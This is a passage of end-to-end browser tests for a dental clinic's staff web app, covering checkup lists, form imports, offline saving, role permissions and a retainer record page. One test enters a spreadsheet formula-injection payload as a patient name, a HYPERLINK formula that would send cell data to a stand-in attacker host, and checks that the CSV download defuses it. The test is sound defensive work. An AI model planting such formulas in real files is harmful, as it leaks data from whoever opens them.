  assert.match(cells[1], /^Form Test Alpha 0300-5550811/);
  assert.equal(cells[2], 'Gulshan (RJ Mall)');
  assert.equal(cells[3], 'General checkup Dr. Hina (sample) Dr. Ali recommended: Yes Understood pricing: Yes', 'the form\'s choice written the website\'s way, the doctor and the answers');
  assert.deepEqual([cells[4], cells[5]], ['Yes', 'Next month']);
  assert.equal(await alpha.locator('select[aria-label^="Follow-up status"]').inputValue(), 'Follow-up Sent', 'REMINDERS "done"');
  assert.equal(cells[8], 'From the Google Form');
  const charlie = rowsOf(pk).filter({ hasText: 'Form Test Charlie' });
  assert.match(await charlie.locator('input[aria-label^="Notes for"]').inputValue(), /^Form answer in the wrong place: "Did you understand the pricing details\?" was "Form Test Someone"/);
  assert.equal((await charlie.locator('td').nth(3).innerText()).trim(), '–', 'the answer in the wrong column is left empty');
  await shot(pk, '18-checkups-from-google-form');
  await pk.goto(BASE + '#/staff/checkups?q=Import%20Test%20Beta');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 1);
  const beta = rowsOf(pk).first();
  assert.equal(await beta.locator('select[aria-label^="Follow-up status"]').inputValue(), 'Interested', 'the old list\'s row keeps its follow-up status');
  assert.equal(await beta.locator('input[aria-label^="Notes for"]').inputValue(),
    'Wants to think; Reminder (Google Form): Started; On the Google Form: "What was your checkup for?" Braces',
    'its own treatment ("Braces consult") stays; what the form said is in the notes, the follow-up status it did not take too (once)');
  assert.match(await beta.innerText(), /Old list: Sample tab B, answers from the Google Form/);
  assert.match(await beta.innerText(), /After Eid/);
  // the Source filter
  await pk.goto(BASE + '#/staff/checkups?source=google_form');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 3);
  assert.equal(await pk.locator('select').filter({ has: pk.locator('option[value="google_form"]') }).first().inputValue(), 'google_form', 'the Source filter "Google Form"');
  // an imported answer with two ticks ("Braces, Scaling and Polishing") and a doctor not on the list opens in Edit as two ticks and Other
  const bravo = rowsOf(pk).filter({ hasText: 'Form Test Bravo' });
  await bravo.getByRole('button', { name: /^Edit / }).click();
  const em = pk.locator('.modal');
  assert.deepEqual([await ticked(forGroup(em)), await ticked(doctorGroup(em))], [['Braces', 'Scaling and polishing'], ['Other']]);
  assert.equal(await em.getByLabel(/^Other: who did the checkup/).inputValue(), 'Someone (sample)');
  await em.getByRole('button', { name: 'Save' }).click();
  await pk.waitForSelector('.toast:has-text("Nothing was changed.")');   // opened and saved as it was: the stored text stays letter for letter
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Admin -> Import -> "6. Checkup Form 2.0 answers": two people on one phone at one branch on one day (a parent\'s phone for two children) are two checkups, never one', async () => {
  const csv = [
    'Timestamp,Patient Full Name,Which Branch did you visit?,Mobile Number,Who did your Checkup?,Did Dr. Ali recommend your treatment?,What was your checkup for?,Did you understand the pricing details?,Would you like to start the treatment?,If yes then when? If no then why not?,REMINDERS',
    '9/5/2026 11:00:00,Sibling Test Aiza,RJ Mall - Karachi,0300-5550931,,No,General Checkup,Yes,No,Only came with her brother,',
    '9/5/2026 11:04:00,Sibling Test Bilal,RJ Mall - Karachi,0300-5550931,,Yes,"Braces, Extraction",Needs More Clear Explanation,Yes,After his exams,', ''].join('\r\n');
  await pk.goto(BASE + '#/staff/admin?tab=import');
  const section = pk.locator('section.panel:has(h2:text("6. Checkup Form 2.0 answers"))');
  await section.locator('input[type=file]').setInputFiles({ name: 'Checkup karwaliya - Form Responses 2.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await section.getByRole('button', { name: 'Import 2 answers' }).waitFor();
  const text = await section.innerText();
  assert.match(text, /2\s+new checkups/);
  assert.match(text, /0\s+already on the website/);
  assert.match(text, /1 answer has the phone of another person on that day's list at that branch, with another name \(often a parent's phone for two children\): it becomes a checkup of its own, not part of the other person's\./);
  await section.getByRole('button', { name: 'Import 2 answers' }).click();
  await section.locator('.alert-info:has-text("Checkup Form 2.0: 2 added")').waitFor();
  await pk.goto(BASE + '#/staff/checkups?q=Sibling%20Test');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 2);
  const aiza = rowsOf(pk).filter({ hasText: 'Sibling Test Aiza' }), bilal = rowsOf(pk).filter({ hasText: 'Sibling Test Bilal' });
  assert.match(await aiza.innerText(), /General checkup[\s\S]*Only came with her brother/);
  assert.match(await bilal.innerText(), /Braces, Extraction[\s\S]*Understood pricing: Needs clearer explanation[\s\S]*After his exams/, 'each with their own answers');
  await shot(pk, '22-import-two-people-one-phone');
});
await step('Admin: the Aaj ki List "All branches" shows the checkup rows with their branch, and the day downloads with a type column', async () => {
  await pk.goto(BASE + '#/staff/sheet?branch=all');
  await pk.waitForSelector('th:text("Branch"):not([hidden])');
  await pk.waitForSelector('table.sheet tbody tr.is-checkup');
  const branches = await pk.locator('table.sheet tbody tr.is-checkup td:first-child').allInnerTexts();
  assert.ok(branches.length >= 3 && branches.every((b) => b.trim().length > 2), 'every checkup row names its branch');
  assert.ok(branches.some((b) => /North Nazimabad/.test(b)) && branches.some((b) => /Gulshan/.test(b)));
  assert.equal(await pk.locator('.add-panel:not([hidden])').count(), 0, 'no add panel in All branches');
  assert.equal(await pk.locator('table.sheet thead th.branch-cell').evaluate((th) => getComputedStyle(th).color), 'rgb(255, 255, 255)', 'the Branch heading is white on the purple header row');
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const [head, ...lines] = csv.split('\n');
  assert.match(head, /,type$/);
  assert.ok(lines.some((l) => /,Checkup$/.test(l)) && lines.some((l) => /,Patient$/.test(l)), 'both kinds of row');
});
await step('Aaj ki List download: a checkup patient named like a formula is written as text, not as a formula', async () => {
  const evil = '=HYPERLINK("https://evil.example/?d="&K2,"Open")';
  await pk.goto(BASE + '#/staff/sheet?branch=2');
  await pk.getByRole('button', { name: '+ Add checkup patient' }).waitFor();
  await quickAdd(pk, evil, '0300 5550956');
  await pk.waitForSelector('.toast:has-text("added to today\'s list for North Nazimabad.")');
  const row = pk.locator('table.sheet tbody tr.is-checkup', { has: pk.locator('input[aria-label^="Name of checkup patient =HYPERLINK"]') });
  await row.waitFor();
  const [download] = await Promise.all([pk.waitForEvent('download'), pk.getByRole('button', { name: 'Download', exact: true }).click()]);
  const csv = fs.readFileSync(await download.path(), 'utf8').replace(/^﻿/, '');
  const line = csv.split('\n').find((l) => l.includes('HYPERLINK'));
  assert.ok(line, 'the checkup patient is in the file');
  assert.ok(line.includes(',"\'=HYPERLINK(""https://evil.example/?d=""&K2,""Open"")",'), 'the cell starts with an apostrophe and is quoted: ' + line.slice(0, 80));
  assert.ok(csv.split('\n').every((l) => !/(^|,)[=@]/.test(l)), 'no cell of the file starts with = or @');
  // leave the list as it was
  await row.getByRole('button', { name: /Checkup options/ }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove from the list' }).click();
  await pk.locator('.modal').getByRole('button', { name: 'Remove', exact: true }).click();
  await row.waitFor({ state: 'detached' });
});
await step('Checkups page: a note typed while offline is kept on this device and saved when the connection is back', async () => {
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  const row = rowsOf(pk).first();
  const id = await row.getAttribute('data-id');
  await pk.context().setOffline(true);
  await pk.locator('.offline-banner:not([hidden])').waitFor();
  await row.locator('input[aria-label^="Notes for"]').fill('Typed offline (test)');
  await pk.waitForFunction(() => /Offline: 1 typed change/.test(document.querySelector('.save-state')?.textContent || ''));
  await pk.context().setOffline(false);
  await pk.waitForFunction(() => document.querySelector('.save-state')?.textContent.trim() === 'All changes saved');
  await pk.goto(BASE + '#/staff/today');
  await pk.waitForSelector('.stat');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector(`table.checkup-table tbody tr[data-id="${id}"]`);
  assert.equal(await pk.locator(`table.checkup-table tbody tr[data-id="${id}"] input[aria-label^="Notes for"]`).inputValue(), 'Typed offline (test)');
});
await step('Edit on an old-list row tells Dr. Ali (and only Dr. Ali) that importing the file again adds the old spelling a second time', async () => {
  await pk.goto(BASE + '#/staff/checkups?q=Import%20Test%20Delta');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 1);
  await rowsOf(pk).first().getByRole('button', { name: /^Edit / }).click();
  assert.match(await pk.locator('.modal').innerText(), /This row came from the old list\. If you change the name or phone, importing that file again adds this person a second time\./);
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Checkups page: Dr. Ali may remove an answer imported from the Google Form, and is told first that importing the file again does not bring it back', async () => {
  await pk.evaluate(async () => {
    const { state } = await import('/js/state.js');
    await state.data.importCheckupForm([{ row: 2, submitted_at: '2026-09-15T11:00:00+05:00', name: 'Form Remove Test', phone: '0300-5550941', branch: 'NN', doctors: null,
      checkup_for: 'Braces', ali_recommended: true, pricing_understood: 'yes', wants_treatment: true, treatment_plan: 'Next month', follow_up: null, notes: null }]);
  });
  await pk.goto(BASE + '#/staff/checkups?q=Form%20Remove%20Test');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 1);
  await rowsOf(pk).first().getByRole('button', { name: /^Edit / }).click();
  const edit = pk.locator('.modal', { hasText: 'Edit Form Remove Test' });
  await edit.waitFor();
  assert.doesNotMatch(await edit.innerText(), /Only Dr\. Ali can remove/, 'Dr. Ali is offered Remove, so nothing says why not');
  await edit.getByRole('button', { name: 'Remove', exact: true }).click();
  const sure = pk.locator('.modal', { hasText: 'Remove Form Remove Test?' });
  await sure.waitFor();
  assert.match(await sure.innerText(), /Remove Form Remove Test's answers imported from the Google Form\? Importing the file again does not bring them back\./);
  await sure.getByRole('button', { name: 'Keep it' }).click();
  await sure.waitFor({ state: 'detached' });
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
});
await step('Front desk (North Nazimabad) on the Checkups page sees the imported North Nazimabad row and the no-branch row, never the RJ Mall or Lahore rows, and cannot remove an old-list row; Remove in Edit asks on top of it and "Keep it" keeps the changed answers', async () => {
  await tryAnotherRole(pk);
  await pk.goto(BASE + '#/login/staff');
  await pk.getByRole('button', { name: /Front desk \(North Nazimabad\)/ }).click();
  await pk.waitForSelector('.topbar');
  await pk.goto(BASE + '#/staff/checkups');
  await pk.waitForSelector('table.checkup-table tbody tr[data-id]');
  await pk.getByLabel('Name or phone').fill('Import Test');
  await pk.waitForFunction(() => document.querySelectorAll('table.checkup-table tbody tr[data-id]').length === 2);
  const names = await pk.locator('table.checkup-table tbody tr[data-id] .checkup-name-text').allInnerTexts();
  assert.deepEqual(names.sort(), ['Import Test Delta', 'Import Test Gamma']);
  await pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Import Test Delta' }).getByRole('button', { name: /^Edit / }).click();
  const m = pk.locator('.modal');
  assert.doesNotMatch(await m.innerText(), /importing that file again/i, 'the note about importing the file again is for Dr. Ali, not for the front desk');
  assert.equal(await m.getByRole('button', { name: 'Remove' }).count(), 0, 'old-list rows are removed by Dr. Ali only');
  assert.match(await m.innerText(), /Only Dr\. Ali can remove a row from the old list\./, 'and the dialog says why Remove is not there');
  await pk.keyboard.press('Escape');
  await pk.waitForSelector('.modal', { state: 'detached' });
  // an answer imported from the Google Form: removed by Dr. Ali only too (a removed answer never comes back), and the dialog says why
  await pk.getByLabel('Name or phone').fill('Form Remove Test');
  const formRow = pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Form Remove Test' });
  await formRow.waitFor();
  await formRow.getByRole('button', { name: /^Edit / }).click();
  const fm = pk.locator('.modal', { hasText: 'Edit Form Remove Test' });
  await fm.waitFor();
  assert.equal(await fm.getByRole('button', { name: 'Remove' }).count(), 0, 'an answer from the Google Form is removed by Dr. Ali only');
  assert.match(await fm.innerText(), /Only Dr\. Ali can remove an answer imported from the Google Form: importing the file again does not bring a removed answer back\./);
  await pk.keyboard.press('Escape');
  // a row the front desk added on the website can be removed from the Edit dialog
  await pk.getByRole('button', { name: '+ Add checkup patient' }).click();
  await fillCheckupForm(pk.locator('.modal'), { name: 'Remove Me Person', phone: '0300 5550103' });
  await pk.locator('.modal').getByRole('button', { name: 'Add checkup patient' }).click();
  await pk.waitForSelector('.modal', { state: 'detached' });
  await pk.getByLabel('Name or phone').fill('Remove Me Person');
  const mine = pk.locator('table.checkup-table tbody tr[data-id]', { hasText: 'Remove Me Person' });
  await mine.waitFor();
  await mine.getByRole('button', { name: /^Edit / }).click();
  // Remove asks on top of Edit: "Keep it" goes back to Edit with the changed answers still there, and nothing asked to discard them.
  const edit = pk.locator('.modal', { hasText: 'Edit Remove Me Person' });
  const sure = pk.locator('.modal', { hasText: 'Remove Remove Me Person?' });
  await edit.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel('No', { exact: true }).check();
  await edit.getByLabel(/^If yes, then when/).fill('After her exams (changed)');
  await edit.getByRole('button', { name: 'Remove', exact: true }).click();
  await sure.waitFor();
  assert.equal(await edit.count(), 1, 'the Edit dialog stays open while the removal is asked');
  await sure.getByRole('button', { name: 'Keep it' }).click();
  await sure.waitFor({ state: 'detached' });
  assert.equal(await pk.locator('.modal').count(), 1, 'only the Edit dialog is open, nothing asked to discard the answers');
  assert.equal(await edit.getByLabel(/^If yes, then when/).inputValue(), 'After her exams (changed)', '"Keep it": the typed answer is still there');
  assert.equal(await edit.getByRole('group', { name: /^Would you like to start the treatment/ }).getByLabel('No', { exact: true }).isChecked(), true, '"Keep it": the changed choice is still there');
  assert.equal(await pk.evaluate(() => document.activeElement?.textContent), 'Remove', '"Keep it": focus is back on Remove');
  await edit.getByRole('button', { name: 'Remove', exact: true }).click();
  await sure.getByRole('button', { name: 'Remove', exact: true }).click();
  await mine.waitFor({ state: 'detached' });
  await pk.waitForSelector('.modal', { state: 'detached' });   // (removed: both dialogs close, nothing asked to discard the answers)
});


// Rows of the Aaj ki List history that have no Mr# never get a patient file; those whose Treatment says checkup are checkup patients and are
// not sent as visits at all (they belong on the checkup list).
const pi = await newPage();
await pi.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const real = d.importAajSheet;
    d.importAajSheet = (rows, create) => { (window.__aajCalls ||= []).push({ create, mr: rows.map((x) => !!x[2]) }); return real(rows, create); };
    return d;
  }));
}
`,
}));
await step('Import "4. Aaj ki List history": rows without an Mr# never get a new patient file (a checkup row is not even sent), rows with an Mr# keep the "Add patient records" choice', async () => {
  await loginAs(pi, 'Dr. Ali Rashid');
  await pi.goto(BASE + '#/staff/admin?tab=import');
  await pi.waitForSelector('h2:text("4. Aaj ki List history")');
  const csv = [
    "Tt Mr #,Tt Patient Name,Monthly,Tt Treatment,Token No,Waiting,Group,Doctor's Name,Tt Treatment Details,P.P,Healthwire,Tt Contact No,Reminder Status",
    '9811,Areeba Siddiqui,4,Monthly,3,Completed,,"Dr. Hina (sample)",U L 016 Pc refresh,,Done,,',
    ',Brand New Nobody,,Checkup,6,Completed,,Dr Nida,,,,0300 5559999,',
    ',Forgot Mr Person,,Filling,7,Completed,,Dr Nida,,,,0300 5558888,', ''].join('\n');
  const aaj = pi.locator('section.panel:has(h2:text("4. Aaj ki List history")) input[type=file]');
  await aaj.setInputFiles({ name: 'aaj-ki-list-sample.csv', mimeType: 'text/csv', buffer: Buffer.from(csv) });
  await pi.waitForSelector('section[data-tab]');
  await pi.locator('section[data-tab] select[aria-label^="Branch for"]').selectOption('2');
  await pi.locator('section[data-tab] input[type=date]').fill('2026-08-20');
  await pi.locator('section[data-tab] input[type=date]').dispatchEvent('change');
  const box = pi.locator('label:has-text("Rows without an Mr# never get a patient file") input[type=checkbox]');
  assert.ok(await box.isChecked(), 'the box stays ticked by default');
  await pi.locator('.alert:has-text("1 row has no Mr# and a Treatment that says checkup")').waitFor();
  await pi.getByRole('button', { name: 'Import 2 visits' }).click();
  await pi.waitForSelector('.alert:has-text("Visits:")');
  assert.deepEqual(await pi.evaluate(() => window.__aajCalls), [{ create: true, mr: [true] }, { create: false, mr: [false] }], 'the checkup row is not sent; the row whose Mr# was forgotten is sent without "Add patient records"');
  await pi.locator('.alert:has-text("Checkup patients not imported as visits: 1")').waitFor();
  await pi.locator('.topsearch input').fill('Brand New Nobody');
  await pi.locator('.search-results:has-text("No patient matches")').waitFor();
});

// ------------------------------------------------------------- the database update has not been run yet (the site keeps working)
const pm = await newPage();
// The demo is cut off from the checkup functions, as the live site is before the two migrations are applied.
await pm.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    const gone = () => { throw Object.assign(new Error('CHECKUPS_MISSING: the checkup list is not switched on yet. It appears once the database update has been run.'), { code: 'CHECKUPS_MISSING' }); };
    d.listDayCheckups = async () => Object.assign([], { missing: true });
    for (const k of ['listCheckups', 'exportCheckups', 'addCheckup', 'updateCheckup', 'deleteCheckup', 'registerCheckupAsPatient', 'linkCheckupToPatient', 'importCheckups']) d[k] = gone;
    d.subscribeCheckups = () => () => {};
    return d;
  }));
}
`,
}));
await step('before the database update: the Aaj ki List works without checkup rows or "+ Add checkup patient", the Today page has no checkup button, and the Checkups page says it is not switched on yet', async () => {
  await loginAs(pm, 'Front desk \\(North Nazimabad\\)');
  await pm.goto(BASE + '#/staff/sheet');
  await pm.waitForSelector('table.sheet tbody tr');
  assert.equal(await pm.locator('table.sheet tbody tr.is-checkup').count(), 0);
  assert.equal(await pm.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
  assert.ok(await pm.getByRole('button', { name: '+ New walk-in' }).count(), 'the walk-in button stays');
  assert.doesNotMatch(await pm.locator('.sheet-counts').innerText(), /Checkups/);
  await pm.goto(BASE + '#/staff/checkups');
  await pm.waitForSelector('.empty:has-text("not switched on yet")');
  assert.equal(await pm.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
  await pm.goto(BASE + '#/staff/today');
  await pm.waitForSelector('.stat');
  assert.equal(await pm.locator('section.today-checkup').count(), 0, 'no checkup button on the Today page either');
});


// The checkups cannot be loaded for another reason: the visits still show, with a small warning.
const pe = await newPage();
await pe.route('**/js/data/index.js', (r) => r.fulfill({
  contentType: 'text/javascript',
  body: `import { DEMO_MODE } from '../config.js';
let p;
export function getData() {
  return (p ||= import('./demo.js').then(async (m) => {
    const d = await m.createDemoAdapter();
    d.listDayCheckups = async () => { throw new Error('The checkup list did not answer.'); };
    return d;
  }));
}
`,
}));
await step('when only the checkups fail to load, the Aaj ki List still shows the patients, with a warning above the table', async () => {
  await loginAs(pe, 'Front desk \\(North Nazimabad\\)');
  await pe.goto(BASE + '#/staff/sheet');
  await pe.waitForSelector('table.sheet tbody tr');
  await pe.locator('.alert-warning:has-text("Checkup patients could not be loaded: The checkup list did not answer.")').waitFor();
  assert.ok((await pe.locator('table.sheet tbody tr:not(.is-checkup)').count()) >= 5, 'the patients are there');
  assert.ok(await pe.getByRole('button', { name: '+ New walk-in' }).count());
});

// A person who may view the list but not edit it (the accountant): everything is read-only.
const pa = await newPage();
await step('Checkups page for a person who may only view: no add, edit or register buttons, and the cells are read-only', async () => {
  await loginAs(pa, 'Accountant');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.getByRole('button', { name: '+ Add checkup patient' }).count(), 0);
  await pa.goto(BASE + '#/staff/today');
  await pa.waitForSelector('.stat');
  assert.equal(await pa.getByRole('button', { name: '+ Add checkup patient' }).count(), 0, 'nor on the Today page (it needs "Add and edit Aaj ki List entries")');
  await pa.goto(BASE + '#/staff/checkups');
  await pa.waitForSelector('table.checkup-table tbody tr[data-id]');
  assert.equal(await pa.locator('table.checkup-table').getByRole('button', { name: /^(Register|Edit) / }).count(), 0);
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('select[aria-label^="Follow-up status for"]').isDisabled());
  assert.ok(await pa.locator('table.checkup-table tbody tr[data-id]').first().locator('input[aria-label^="Notes for"]').isDisabled());
});

// ------------------------------------------------------------- Retainer Record and Lab work (owner, 12 Oct 2026)
// Dr. Ali's own page (its own in-memory demo data). Every name is the demo's made-up one.
const pr = await newPage();
const chipCounts = async (name) => (await pr.locator('.rl-chip', { hasText: name }).locator('.rl-counts').innerText()).replace(/\s+/g, ' ').trim();
await step('Retainer Record: the Coordinator menu opens it, laid out like the sheet: city tabs, the purple header row in the sheet\'s order, the Retainer Lab banner', async () => {
  await loginAs(pr, 'Dr. Ali Rashid');
  await pr.locator('.topnav .menu:has-text("Coordinator") > button').click();
  await pr.locator('.topnav .menu-list a', { hasText: 'Retainer Record' }).click();
  await pr.waitForSelector('table.rs-table tbody tr[data-id]');
  assert.equal(await pr.locator('h1').innerText(), 'Retainer Record');
  assert.deepEqual((await pr.locator('.rs-tabs [role="tab"]').allInnerTexts()).map((t) => t.trim()), ['Karachi', 'Lahore', 'Islamabad'], 'one tab per city with branches');
  assert.deepEqual((await pr.locator('table.rs-table thead th').allInnerTexts()).map((t) => t.trim()),
    ['# · Patient name', 'Mr#', 'Impression date', 'Model check by', 'Retainer made by', 'Retainer date', 'Status', 'Retainer sheet', 'Payments', 'Next check', 'Contact', 'Notes']);
  const head = await pr.locator('table.rs-table thead th').first().evaluate((el) => getComputedStyle(el).backgroundColor);
  assert.equal(head, 'rgb(90, 45, 130)', 'the sheet\'s purple header');
  // On a laptop (1366 wide) the sheet's own nine columns are in sight; with the page scrolled down to the sheet, the tabs sit under the
  // top bar and the frame ends on the screen (its sideways scrollbar too). (Measured once the fonts are in.)
  await pr.evaluate(() => document.fonts.ready);
  const fit = await pr.evaluate(() => {
    window.scrollTo(0, document.documentElement.scrollHeight);
    const w = document.querySelector('.rs-wrap').getBoundingClientRect();
    const cut = [...document.querySelectorAll('table.rs-table thead th')].slice(0, 9).filter((th) => th.getBoundingClientRect().right > w.right + 1).map((th) => th.textContent);
    const out = { cut, tabs: Math.round(document.querySelector('.rs-tabs').getBoundingClientRect().top), bar: Math.round(document.querySelector('.topbar').getBoundingClientRect().bottom), bottom: Math.round(w.bottom), height: innerHeight };
    window.scrollTo(0, 0);
    return out;
  });
  assert.deepEqual(fit.cut, [], 'the nine columns of the sheet fit');
  assert.ok(fit.bottom <= fit.height, `the frame ends at ${fit.bottom}px of a ${fit.height}px window`);
  assert.ok(fit.tabs >= fit.bar, `the tabs (${fit.tabs}px) are not under the top bar (${fit.bar}px)`);
  // ... and beside them the patient's name has room for 22 characters ("Muhammad Abdullah Khan" in the cell's own font); a longer name ends
  // in "…", and its tooltip has it whole.
  const nameRoom = await pr.evaluate(() => {
    const input = document.querySelector('table.rs-table tbody .rs-who-cell input');
    const cs = getComputedStyle(input);
    const c = document.createElement('canvas').getContext('2d');
    c.font = cs.font;
    return { room: input.clientWidth - parseFloat(cs.paddingLeft) - parseFloat(cs.paddingRight), need: c.measureText('Muhammad Abdullah Khan').width, overflow: cs.textOverflow, title: input.title, value: input.value };
  });
  assert.ok(nameRoom.room >= nameRoom.need, `the name has room for 22 characters (${Math.round(nameRoom.room)}px for ${Math.round(nameRoom.need)}px)`);
  assert.equal(nameRoom.overflow, 'ellipsis', 'a longer name ends in "…"');
  assert.ok(nameRoom.value && nameRoom.title === nameRoom.value, 'the tooltip has the whole name');
  assert.ok((await pr.locator('table.rs-table tbody .rs-name[title]').count()) > 0, 'a linked name has its tooltip too');
  // The keyboard ring of a dark chip goes around it (inside, it did not show on the deep purple or the black).
  await pr.locator('table.rs-table select[aria-label^="Retainer made by"]').first().focus();
  await pr.keyboard.press('Shift+Tab');
  assert.deepEqual(await pr.evaluate(() => { const s = getComputedStyle(document.activeElement); return [document.activeElement.dataset.field, s.outlineWidth, s.outlineOffset]; }),
    ['model_check_by', '3px', '2px']);
  assert.match(await pr.locator('.page-head p').first().innerText(), /^Karachi: 56 retainers$/);
  assert.match(await pr.locator('.rl-banner h2').innerText(), /Retainer Lab/);
  assert.deepEqual((await pr.locator('.rl-chip .rl-name').allInnerTexts()).map((t) => t.trim()), ['Hassan (sample)', 'Kamran (sample)', 'Rizwan (sample)', 'Dr. Hina (sample)'],
    'the people marked "In the banner" for Karachi: the makers first, then the model checker');
  assert.match(await chipCounts('Dr. Hina (sample)'), /^This month \d+ checked · All time [1-9]\d* checked$/, 'a model checker\'s chip counts the models checked, this month and all time');
  // Every chip says this month's numbers and all time's, so the banner never shows only zeros (right after the copy of a tab, or on the
  // first of a month); the tab's numbers too.
  for (const t of await pr.locator('.rl-chip').filter({ hasNotText: 'Dr. Hina' }).locator('.rl-counts').allInnerTexts()) {
    assert.match(t.replace(/\s+/g, ' ').trim(), /^This month \d+ made, \d+ delivered(, \d+ checked)? · All time [1-9]\d* made$/, t);
  }
  assert.match(await pr.locator('.rl-banner .rl-all').innerText(), /^All time: [1-9][\d,]* made · [1-9][\d,]* delivered$/);
  // Each maker's own colour, on the banner and on every chip in the table.
  assert.ok(await pr.locator('.rl-chip.c-black', { hasText: 'Hassan' }).count());
  const hassanChips = await pr.locator('table.rs-table select[aria-label^="Retainer made by"]').evaluateAll((els) => els.filter((s) => s.selectedOptions[0]?.textContent === 'Hassan (sample)').map((s) => s.className));
  assert.ok(hassanChips.length && hassanChips.every((c) => c === 'pill c-black'), 'Hassan is black wherever he is chosen');
  assert.ok(await pr.locator('table.rs-table select.pill.c-purple[aria-label^="Model check by"]').count(), 'model checkers: the deep purple chip');
  await shot(pr, '40-retainer-record');
});
await step('Retainer Record: + New retainer adds a row at the top, an edit saves at once, and Delivered shows the "Delivered!" moment and moves the banner', async () => {
  const before = await chipCounts('Hassan (sample)');
  const [made, delivered, allMade] = before.match(/\d+/g).map(Number);
  await pr.locator('.page-head').getByRole('button', { name: '+ New retainer' }).click();
  const m = pr.locator('.modal');
  await m.getByLabel('Patient name').fill('Sample Retainer Test');
  await m.getByLabel('Contact').fill('0300-5559001');
  await m.getByLabel('Retainer made by').selectOption({ label: 'Hassan (sample)' });
  await m.getByRole('button', { name: 'Add retainer' }).click();
  await pr.waitForSelector('.toast:has-text("Sample Retainer Test added")');
  const first = pr.locator('table.rs-table tbody tr[data-id]').first();
  assert.equal(await first.locator('input[aria-label="Patient name, row 1"]').inputValue(), 'Sample Retainer Test', 'newest first: the new row is row 1');
  assert.equal(await first.locator('select[aria-label="Status for Sample Retainer Test"]').inputValue(), 'Impression taken');
  // A chip saves at once.
  await first.locator('select[aria-label="Retainer sheet for Sample Retainer Test"]').selectOption('Re-purchase needed');
  await pr.waitForSelector('table.rs-table tbody tr[data-id] select.pill.c-red[aria-label="Retainer sheet for Sample Retainer Test"]');
  // Delivered: the toast with a check mark, the dates filled in, the banner moves.
  await pr.locator('select[aria-label="Status for Sample Retainer Test"]').selectOption('Delivered to patient');
  await pr.waitForSelector('.toast.toast-delivered:has-text("Delivered!")');
  assert.ok(await pr.locator('.toast.toast-delivered .rl-tick').count(), 'with a check mark');
  assert.match(await pr.locator('.toast.toast-delivered').innerText(), /Sample Retainer Test has the retainer\. Well done, Hassan\. First check: \d{1,2} [A-Z][a-z]{2,3} \d{4}\./);
  assert.ok((await pr.locator('input[aria-label="Retainer date for Sample Retainer Test"]').inputValue()).length === 10, 'the retainer date is filled in');
  // The first retainer check: a calendar month after the day it was delivered (the rule of the old Coordinator -> Retainers list).
  const firstCheck = await pr.evaluate(async () => { const { localISO, addMonthsISO } = await import('/js/ui/dom.js'); return addMonthsISO(localISO(), 1); });
  assert.equal(await pr.locator('input[aria-label="Next check for Sample Retainer Test"]').inputValue(), firstCheck, 'the next check is a month later');
  assert.equal(await chipCounts('Hassan (sample)'), `This month ${made + 1} made, ${delivered + 1} delivered · All time ${allMade + 1} made`);
  assert.equal(await pr.locator('select[aria-label="Status for Sample Retainer Test"]').evaluate((s) => s.className), 'pill c-green', 'Delivered is the light green chip');
  await shot(pr, '41-retainer-delivered');
});
await step('Retainer Record: typed cells save by themselves and stay after leaving the page', async () => {
  await pr.locator('input[aria-label="Notes for Sample Retainer Test"]').fill('Upper and lower, clear');
  await pr.locator('input[aria-label="Contact for Sample Retainer Test"]').fill('0300-5559002');
  await pr.locator('input[aria-label="Impression date for Sample Retainer Test"]').fill('2026-10-01');
  // The typed cells go through the offline queue (a moment later); the date is saved at once.
  await pr.waitForFunction(async () => {
    const { state } = await import('/js/state.js');
    const row = (await state.data.retainerRecords({ cityId: 1 })).find((r) => r.patient_name === 'Sample Retainer Test');
    return row?.notes === 'Upper and lower, clear' && row?.contact === '0300-5559002' && row?.impression_date === '2026-10-01';
  });
  await pr.waitForSelector('.save-status[data-state="saved"]');
  await pr.goto(BASE + '#/staff/today');
  await pr.goto(BASE + '#/staff/retainers');
  await pr.waitForSelector('input[aria-label="Notes for Sample Retainer Test"]');
  assert.equal(await pr.locator('input[aria-label="Notes for Sample Retainer Test"]').inputValue(), 'Upper and lower, clear');
  assert.equal(await pr.locator('input[aria-label="Contact for Sample Retainer Test"]').inputValue(), '0300-5559002');
  assert.equal(await pr.locator('input[aria-label="Impression date for Sample Retainer Test"]').inputValue(), '2026-10-01');
  assert.equal(await pr.locator('select[aria-label="Retainer sheet for Sample Retainer Test"]').inputValue(), 'Re-purchase needed');
});
await step('Retainer Record: a chip chosen while a typed note is still on its way (a slow line) never empties the note on screen', async () => {
  await pr.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const orig = state.data.updateRetainerRecord;
